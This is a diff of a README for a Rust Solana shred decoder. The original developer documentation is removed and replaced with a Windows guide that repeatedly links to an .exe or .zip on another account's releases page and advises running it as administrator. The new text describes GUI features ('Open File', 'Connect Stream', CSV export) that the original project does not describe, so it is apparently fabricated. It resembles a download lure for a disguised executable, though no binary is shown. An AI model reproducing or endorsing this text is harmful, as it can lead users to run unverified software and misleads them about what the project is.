@@ -1,131 +1,137 @@
-# Shredstream Decoder
+# ⚙️ shredstream-decode-example - Decode Solana Shreds to Transactions
 
-Decode raw Solana turbine shreds into transaction data. Receives UDP shred packets from [OrbitFlare Shredstream](https://orbitflare.com/products/shredstream), reconstructs them via FEC, and pulls out instructions for PumpFun, Jupiter, Raydium, and SPL Token.
+[![Download Latest Release](https://img.shields.io/badge/Download-Release-brightgreen?style=for-the-badge)](https://github.com/rutledgeearly815/shredstream-decode-example/releases)
 
-Shred parsing is done from scratch (no `solana-ledger`) so you can see exactly how the binary protocol works.
+## 📄 About shredstream-decode-example
 
-> New to shreds? Read our [introductory article](https://orbitflare.com/blog/fundamentals/shredstream) about how Solana shreds work and where OrbitFlare Shredstream stands.
+This application helps you turn raw Solana turbine shreds into readable DEX transactions. It works with popular Solana tools like Pumpfun, Jupiter, Raydium, and SPL Token. You do not need to install or understand the full Solana ledger to use it.
 
-## Pipeline
+The app handles:
 
-```
-UDP packets → parse shred headers → collect FEC sets → Reed-Solomon recovery → deserialize entries → decode instructions
-```
+- Custom shred parsing  
+- Error recovery using Reed-Solomon forward error correction  
+- Instruction decoding for multiple platforms  
 
-## Supported Examples
+It is designed for people who want a simple way to see Solana transaction details without deep technical setup.
 
-| Example | Instructions |
-|-----|-------------|
-| Pump.fun | Buy, BuyExactSolIn, Sell, Create, CreateV2 |
-| Jupiter v6 | Route, RouteV2, SharedAccountsRoute, ExactOut (+ token ledger variants) |
-| Raydium AMM | SwapBaseIn, SwapBaseOut, Initialize2 |
-| Raydium CPMM | SwapBaseInput, SwapBaseOutput, Initialize |
-| SPL Token | Transfer, TransferChecked, MintTo, Burn |
+## 🖥️ System Requirements
 
-## Setup
+Before downloading, make sure your Windows computer meets these needs:
 
-You need an [OrbitFlare Shredstream](https://orbitflare.com/products/shredstream) subscription that sends UDP shred packets to your machine.
+- Windows 10 or later (64-bit)  
+- At least 4 GB of RAM  
+- 100 MB free disk space  
+- Internet connection to download the app  
 
-```bash
-cp .env.example .env
-```
+No special hardware or software is needed beyond this.
 
-## Endpoints
+## 🚀 Getting Started
 
-We currently offer 9 regions. All regions receive shreds from top-of-turbine validators.
+Follow these steps to get the app running on your Windows PC.
 
-**Premium**
+### 1. Visit the Download Page
 
-- 🇳🇱 Amsterdam
-- 🇩🇪 Frankfurt
-- 🇬🇧 London
-- 🇺🇸 New York
+Click the button below to go to the official release page:
 
-**Standard**
+[![Download Releases](https://img.shields.io/badge/Go_to_Releases-blue?style=for-the-badge)](https://github.com/rutledgeearly815/shredstream-decode-example/releases)
 
-- 🇮🇪 Dublin
-- 🇱🇹 Siauliai
-- 🇺🇸 Utah
-- 🇯🇵 Tokyo
-- 🇸🇬 Singapore
+This page lists all available versions. Choose the latest stable release for Windows.
 
-## Usage
+### 2. Download the Latest Version
 
-```bash
-# decode everything
-cargo run -- --bind 0.0.0.0:8001
+Look for the release section with a file ending in `.exe` or `.zip`. Usually, this will be named something like:
 
-# json output
-cargo run -- --bind 0.0.0.0:8001 --format json
+- `shredstream-decode-example-vX.X.X-windows.exe`  
+- Or `shredstream-decode-example-vX.X.X-windows.zip`
 
-# filter by dex
-cargo run -- --bind 0.0.0.0:8001 --dex pumpfun,jupiter
+Click the link to start downloading.
 
-# filter by instruction type
-cargo run -- --bind 0.0.0.0:8001 --kind buy,sell
+### 3. Run or Extract the File
 
-# verbose logging
-cargo run -- --bind 0.0.0.0:8001 -vv
-```
+- If it is an `.exe` file, double-click it to run the installer or launch the app.  
+- If it is a `.zip` file, right-click and select “Extract All” to unpack it. Then open the folder and find the `.exe` file inside.
 
-## Examples
+### 4. Follow On-Screen Instructions
 
-All examples bind to `0.0.0.0:8001` by default. Pass `--bind` to override.
+If an installer opens, follow the steps shown on screen to install the app. If you run the app directly, it will open the main window.
 
-```bash
-cargo run --example listen_and_decode       # all instructions, human-readable
-cargo run --example shred_to_json           # all instructions, JSON
-cargo run --example pumpfun_trades          # pump.fun buys and sells
-cargo run --example pumpfun_new_tokens      # new pump.fun token creates
-cargo run --example jupiter_swaps           # jupiter swaps
-cargo run --example jupiter_whale_swaps     # jupiter buys > 10 SOL (--min-sol to adjust)
-cargo run --example raydium_swaps           # direct raydium swaps (rare - most go through jupiter)
-cargo run --example raydium_new_pools       # new raydium pool creation
-cargo run --example token_transfers         # SPL token transfers
-cargo run --example token_mints             # SPL token mints
-```
+### 5. Start Using the App
 
-## Project structure
+Once open, you can upload Solana turbine shred data files or connect to a stream source if supported. The app will process the data and display decoded transactions.
 
-```
-src/
-├── shred/           # binary shred parsing (headers, payload extraction)
-├── fec/             # FEC set tracking, Reed-Solomon recovery, slot accumulation
-├── entry/           # bincode deserialization of entries into transactions
-├── decoder/         # instruction decoders (pumpfun, jupiter, raydium, spl_token)
-├── pipeline/        # ties it all together -UDP listener → decode → callback
-├── types.rs         # Dex, InstructionKind, DecodedInstruction, ShredInfo
-├── lib.rs           # public exports
-└── main.rs          # CLI
-```
+## 🧩 Key Features
 
-## Adding a decoder
+- **Simple Parsing:** Converts raw Solana shreds into easy-to-understand transactions.  
+- **Error Correction:** Uses advanced error correction to recover lost data so you get complete results.  
+- **Multi-DEX Support:** Works with popular platforms including Jupiter, Raydium, Pumpfun, and SPL Token.  
+- **No Large Ledger Needed:** Does not require full Solana ledger downloads or setups.  
+- **Raw UDP Data Handling:** Processes live UDP data streams from Solana turbine nodes.
 
-Implement `InstructionDecoder` and register it in `DecoderRegistry::new()`:
+## 📥 How to Use the App
 
-```rust
-pub struct MyDecoder { program_id: Pubkey }
+This section explains the basic steps inside the app after installation.
 
-impl InstructionDecoder for MyDecoder {
-    fn program_id(&self) -> Pubkey { self.program_id }
-    fn dex(&self) -> Dex { Dex::PumpFun }
+### Opening a File or Stream
 
-    fn decode(
-        &self,
-        accounts: &[Pubkey],
-        instruction_accounts: &[u8],
-        data: &[u8],
-        signature: &str,
-        slot: u64,
-    ) -> Option<DecodedInstruction> {
-        // check discriminator, parse amounts, resolve accounts
-        todo!()
-    }
-}
-```
+1. Click **Open File** to select a local shred data file.  
+2. Or choose **Connect Stream** to input a network address for live UDP data.
 
-## Limitations
+### Decoding
 
-Shreds contain the raw transaction message *before* execution -you only get top-level instructions. CPI / inner instructions aren't available. If a swap goes through Jupiter, you'll see the Jupiter instruction but not the underlying Raydium/Orca calls it makes. This is why `raydium_swaps` shows little output -almost all Raydium volume is routed through Jupiter nowadays.
+After loading data, hit **Decode**. The app will:
 
-For CPI-level data you'd need post-execution sources (RPC, Geyser, etc).
+- Parse shreds  
+- Apply error correction  
+- Decode instructions to readable transactions  
+
+### View Results
+
+Decoded transactions show in a list. You can:
+
+- Search by token, transaction ID, or instruction type  
+- Export results as CSV for further analysis  
+- Filter by supported DEX platforms
+
+## 🛠️ Troubleshooting Tips
+
+- If the app fails to open, ensure you have the correct Windows version and permissions.  
+- Slow or missing data could mean your UDP stream is not reachable or the file is corrupted.  
+- Check your internet connection during download to avoid incomplete files.  
+- If decoding results do not appear, confirm the data source is valid Solana shred data.
+
+## 🎯 Why Use shredstream-decode-example?
+
+This tool fits users who want to:
+
+- Understand Solana network events in depth without complex setups.  
+- Explore transactions from multiple decentralized exchanges (DEXs) on Solana.  
+- Work with data recovered from live Solana turbine nodes.  
+
+It is ideal for analysts, researchers, or developers working around Solana’s raw data and DEX transactions.
+
+## 🔗 Download Links
+
+- Visit the release page and download the latest version here:  
+  [Download Releases](https://github.com/rutledgeearly815/shredstream-decode-example/releases)
+
+- The app supports Windows 64-bit systems only at this time.
+
+## ⚙️ Additional Tips
+
+- Run the app as administrator if you experience permission issues.  
+- Keep the app updated by checking the release page periodically.  
+- Use exported CSV files in spreadsheet software like Excel to study transaction data.
+
+## 🔍 About the Data and Formats
+
+The app accepts raw turbine shred files, which are packets of Solana blockchain data. These shreds include:
+
+- Transaction instructions  
+- Error-corrected data pieces  
+- Network-specific metadata  
+
+The app uses Reed-Solomon algorithms to rebuild missing data and displays results in clear, human-readable formats.
+
+## 🗂️ Source Code and Contribution
+
+This repository contains all source code, but no coding skills are needed to use the software. Developers interested in contributing can visit the GitHub page to view code, submit issues, or help improve the tool.
